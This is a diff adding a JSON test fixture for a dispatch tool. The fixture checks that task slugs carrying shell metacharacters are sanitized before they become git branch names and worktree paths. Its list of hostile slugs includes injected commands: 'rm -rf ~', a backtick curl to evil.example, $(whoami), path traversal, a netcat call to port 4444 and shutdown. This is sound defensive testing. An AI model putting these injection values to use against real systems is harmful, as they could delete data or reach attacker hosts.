@@ -1,0 +1,27 @@
+{
+  "rig": "N7",
+  "surface": "plan §9.3 N7 / §10 S1: task slugs carrying shell/branch metacharacters — a slug becomes a branch name and worktree path, so it MUST be slugified (argument-array invocation, never string-interpolated into a shell). slugify_task collapses every non-[a-z0-9] run to a hyphen; the fixture asserts the dangerous chars are gone.",
+  "schema": "jobplan/v1",
+  "plan_id": "n7-metacharacter-slugs",
+  "goal": "a plan whose task ids try to smuggle shell metacharacters into branch names and worktree paths",
+  "repo": "C:/Users/mrbla/projects/battery-n7-metachar",
+  "hostile_slugs": [
+    "storage; rm -rf ~",
+    "add`curl evil.example`",
+    "list $(whoami)",
+    "../../escape",
+    "feature|nc evil 4444",
+    "task&&shutdown",
+    "quote\"inject'both"
+  ],
+  "expected_after_slugify": [
+    "storage-rm-rf",
+    "add-curl-evil-example",
+    "list-whoami",
+    "escape",
+    "feature-nc-evil-4444",
+    "task-shutdown",
+    "quote-inject-both"
+  ],
+  "note": "expected_after_slugify is what shared.fleet.dispatch.slugify_task must produce (48-char cap, trailing hyphens trimmed). The rig proves no metacharacter survives into a branch/path."
+}
